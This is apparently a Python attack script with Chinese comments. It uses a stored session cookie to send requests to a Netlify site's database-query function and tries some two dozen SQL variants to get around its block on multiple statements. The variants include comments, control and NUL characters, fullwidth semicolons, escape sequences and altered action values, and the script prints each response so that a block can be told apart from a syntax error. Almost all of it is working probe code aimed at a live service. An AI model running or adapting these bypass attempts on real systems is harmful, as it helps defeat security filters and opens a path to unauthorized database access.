# -*- coding: utf-8 -*-
"""database-query 接口 SQL 变异:绕过多语句拦截(区分拦截/语法错误消息)"""
import http.client, ssl, gzip, brotli, json, sys
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A

SITE_A = '04f08ff6-f274-47ac-b6d7-5fb1e055f3b4'
ctx = ssl.create_default_context()

def req(path, body, ctype='application/json'):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=25)
    h = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0',
         'Accept-Encoding': 'br, gzip', 'Accept': 'application/json', 'Cookie': COOKIE_A,
         'Content-Type': ctype}
    payload = body if isinstance(body, bytes) else json.dumps(body).encode()
    conn.request('POST', path, body=payload, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    conn.close()
    return st, raw

P = '/.netlify/functions/database-query'
def mk(sql, action='query'):
    return {'siteId': SITE_A, 'action': action, 'sql': sql}

# A. SQL 层多语句绕过变体
cases = [
    ('baseline multi',        mk('select 1; select 2')),
    ('semi tail only',        mk('select 1;')),
    ('comment mid',           mk('select 1 /**/; /**/ select 2')),
    ('comment tail',          mk('select 1; -- x')),
    ('hash comment',          mk('select 1; # x')),
    ('newline semi',          mk('select 1\n;\nselect 2')),
    ('crlf semi',             mk('select 1\r\n;\r\nselect 2')),
    ('vtab semi',             mk('select 1\x0b;\x0bselect 2')),
    ('nul semi',              mk('select 1;\x00select 2')),
    ('double semi',           mk('select 1;; select 2')),
    ('mixed case',            mk('SeLeCt 1; SeLeCt 2')),
    ('pg version',            mk('select version(); select 2')),
    ('ctalias cte',           mk('with x as (select 1) select * from x; select 2')),
    ('parenthesized',         mk('(select 1); (select 2)')),
    ('explain',               mk('explain select 1; select 2')),
    ('quote odd',             mk("select 'x'; select 2")),
    ('unicode semi',          mk('select 1\uFF1Bselect 2')),
    ('backslash semi',        mk('select 1\\;select 2')),
    ('js unicode esc',        mk('select 1\\u003b select 2')),
    ('transaction action',    mk('select 1; select 2', 'transaction')),
    ('check action multi',    mk('select 1; select 2', 'check')),
    ('check action single',   mk('select 1', 'check')),
    ('lower action',          mk('select 1', 'QUERY')),
    ('action w/ space',       mk('select 1', 'query ')),
]
for label, b in cases:
    try:
        s, raw = req(P, b)
        body = raw[:200].decode('utf-8', 'ignore').replace('\n', ' ')
        print('%-24s %d %s' % (label, s, body))
    except Exception as e:
        print('%-24s ERR %s' % (label, str(e)[:60]))
